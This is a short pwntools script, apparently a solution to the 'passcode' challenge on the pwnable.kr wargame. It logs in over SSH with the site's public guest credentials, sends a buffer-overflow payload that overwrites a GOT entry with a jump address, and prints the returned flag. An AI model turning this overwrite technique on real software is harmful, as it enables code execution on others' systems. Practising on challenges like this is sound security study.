from pwn import *

payload = b"A"*96 + p32(0x804a004)  + str.encode(str(0x080485d7))

r = ssh('passcode' ,'pwnable.kr' ,password='guest', port=2222)
p = r.process(executable='./passcode', argv=['passcode',payload])
p.recvline()
p.sendline(payload)
flag = p.recvall()
print()
print(flag)
p.close()
r.close()

